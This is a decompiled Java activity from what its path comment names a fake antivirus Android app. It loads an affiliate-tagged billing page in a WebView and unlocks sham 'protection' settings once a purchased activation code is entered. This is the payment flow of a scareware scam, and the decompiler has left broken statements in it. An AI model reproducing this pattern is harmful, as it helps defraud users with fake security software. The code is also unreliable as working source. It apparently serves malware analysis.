package com.example.androiddefender2;

import android.app.Activity;
import android.app.AlertDialog;
import android.app.ProgressDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.view.Menu;
import android.view.MotionEvent;
import android.view.View;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;
import system.AppSingleton;

public class PayFormActivity extends Activity {
  public static PayFormActivity self;
  
  Button btnOk = null;
  
  Button btnResumeWork = null;
  
  EditText edtActivationCode = null;
  
  ProgressBar pbPreloader;
  
  private ProgressDialog pd;
  
  TextView tvKeyInfo = null;
  
  public void btnOk_Click(View paramView) {
    String str = this.edtActivationCode.getText().toString();
    if (str.equals("")) {
      Toast.makeText(getApplicationContext(), getResources().getString(2131099748), 0).show();
      return;
    } 
    if ((DefenderApplication.getInstance()).activation_code.equals(str)) {
      DefenderApplication.getInstance();
      SharedPreferences.Editor editor = getSharedPreferences(DefenderApplication.APP_PREF, 0).edit();
      editor.putBoolean("appActivaten", true);
      editor.putBoolean("chkProtectSMS", true);
      editor.putBoolean("chkProtectCallRec", true);
      editor.putBoolean("chkProtectGeoLoc", true);
      editor.commit();
      (AppSingleton.getInstance()).activaten = true;
      AlertDialog.Builder builder = new AlertDialog.Builder((Context)this);
      builder.setTitle(getResources().getString(2131099778));
      builder.setMessage(getResources().getString(2131099779));
      builder.setPositiveButton(getResources().getString(2131099777), new DialogInterface.OnClickListener() {
            public void onClick(DialogInterface param1DialogInterface, int param1Int) {
              switch (param1Int) {
                default:
                  return;
                case -1:
                  break;
              } 
              PayFormActivity.this.btnResumeWork.setVisibility(0);
              PayFormActivity.this.btnOk.setVisibility(4);
              PayFormActivity.this.edtActivationCode.setText("");
              PayFormActivity.this.edtActivationCode.setVisibility(4);
              PayFormActivity.this.tvKeyInfo.setVisibility(4);
            }
          });
      builder.create().show();
      return;
    } 
    Toast.makeText(getApplicationContext(), getResources().getString(2131099749), 0).show();
    this.edtActivationCode.setText("");
  }
  
  public void btnResumeWork_Click(View paramView) {
    Intent intent = new Intent((Context)this, SingleScanActivity.class);
    intent.putExtra("scanApplication", true);
    intent.putExtra("scanSDCard", false);
    intent.putExtra("sendToMain", true);
    startActivity(intent);
    finish();
  }
  
  protected void onCreate(Bundle paramBundle) {
    super.onCreate(paramBundle);
    setContentView(2130903045);
    self = this;
    if (!isFinishing()) {
      this.pd = new ProgressDialog((Context)this);
      this.pd.setTitle("Please wait...");
      this.pd.setMessage("Please wait when we loading billing page ");
      this.pd.show();
    } 
    try {
      WebView webView = (WebView)findViewById(2131296272);
      webView.getSettings().setAppCacheEnabled(false);
      webView.getSettings().setSavePassword(false);
      webView.getSettings().setSaveFormData(false);
      webView.getSettings().setJavaScriptEnabled(true);
      webView.requestFocus();
      webView.getSettings().setUseWideViewPort(true);
      View.OnTouchListener onTouchListener = new View.OnTouchListener() {
          public boolean onTouch(View param1View, MotionEvent param1MotionEvent) {
            switch (param1MotionEvent.getAction()) {
              default:
                return false;
              case 0:
              case 1:
                break;
            } 
            if (!param1View.hasFocus())
              param1View.requestFocus(); 
          }
        };
      super(this);
      webView.setOnTouchListener(onTouchListener);
      WebViewClient webViewClient = new WebViewClient() {
          public void onLoadResource(WebView param1WebView, String param1String) {}
          
          public void onPageFinished(WebView param1WebView, String param1String) {
            if (PayFormActivity.this.pd.isShowing())
              PayFormActivity.this.pd.dismiss(); 
          }
          
          public boolean shouldOverrideUrlLoading(WebView param1WebView, String param1String) {
            if (param1String.equals(param1String)) {
              param1WebView.loadUrl(param1String);
              return true;
            } 
            return false;
          }
        };
      super(this);
      webView.setWebViewClient(webViewClient);
      String str = (DefenderApplication.getInstance()).bySite;
      if (getResources().getBoolean(2131034112)) {
        str = str.replace("$devtype$", "pad");
      } else {
        str = str.replace("$devtype$", "wap");
      } 
      StringBuilder stringBuilder = new StringBuilder();
      this();
      webView.loadUrl(stringBuilder.append(str).append("&affid=").append((DefenderApplication.getInstance()).affID).toString());
      this.edtActivationCode = (EditText)findViewById(2131296273);
      this.btnResumeWork = (Button)findViewById(2131296276);
      this.btnOk = (Button)findViewById(2131296275);
      this.tvKeyInfo = (TextView)findViewById(2131296274);
    } catch (Exception exception) {
      Toast.makeText(getApplicationContext(), exception.getMessage(), 0).show();
    } 
  }
  
  public boolean onCreateOptionsMenu(Menu paramMenu) {
    getMenuInflater().inflate(2131230731, paramMenu);
    return true;
  }
}


/* Location:              /home/fahim/Desktop/fake_av_reader-dex2jar.jar!/com/example/androiddefender2/PayFormActivity.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */